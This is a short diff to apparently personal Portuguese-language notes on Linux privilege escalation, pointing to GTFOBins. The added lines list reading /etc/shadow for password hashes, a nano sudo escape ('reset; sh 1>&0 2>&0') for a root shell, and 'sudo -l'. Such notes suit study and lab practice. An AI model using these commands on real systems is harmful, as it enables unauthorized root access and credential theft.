@@ -6,4 +6,10 @@ https://gtfobins.github.io/
 
 voce pode procurar exploits para uma determinada maquina sabendo a versao (voce pode saber a versao utilizando "cat /proc/version")
 
+cat /etc/shadow (e onde fica as hash de password)
+
+reset; sh 1>&0 2>&0 (exploit para subir para root em usuarios que tenham sudo nano "permissao sudo pro nano") voce da ctrl + r, depois cola os parametros, depois da ctrl + x
+
+sudo -l (mostra as permissoes do usuario atual)
+
 ---END---
